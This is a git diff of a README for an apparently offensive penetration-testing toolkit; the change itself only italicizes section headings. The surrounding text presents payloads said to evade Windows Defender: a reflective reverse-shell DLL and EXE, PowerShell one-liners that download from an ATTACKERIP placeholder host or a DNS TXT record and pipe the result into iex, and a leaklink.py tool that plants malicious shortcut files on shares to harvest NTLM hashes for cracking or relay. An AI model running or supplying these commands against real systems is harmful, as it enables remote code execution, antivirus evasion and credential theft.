@@ -180,14 +180,14 @@ Containers provide a means of bundling your dependencies (trigger, payload, and 
 
 ### [111] The following payloads was tested successfully against Windows Defender.
 
-[1] [Reflective Payload](#reflectivedll): cObO.dll, bOlO.exe (windows/x64/shell_reverse_tcp)
+*[1] [Reflective Payload](#reflectivedll): cObO.dll, bOlO.exe (windows/x64/shell_reverse_tcp)*
 Triggers
 ```bash
 ps> powershell iex(new-object System.Net.WebClient).DownloadString("http://ATTACKERIP:TCPORT/bOlO.exe")
 ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
 ```
 
-[2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT
+*[2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT*
 
 [Obfuscate](./tools/triggers/oneline.txt)
 
@@ -206,7 +206,7 @@ ps> iwr http://domain_oneline.txt | iex
 ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
 ```
 
-[3] Leak Link NTLM Relay
+*[3] Leak Link NTLM Relay*
 
 [leaklink.py](./tools/leaklink/) is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
 Running the python script:
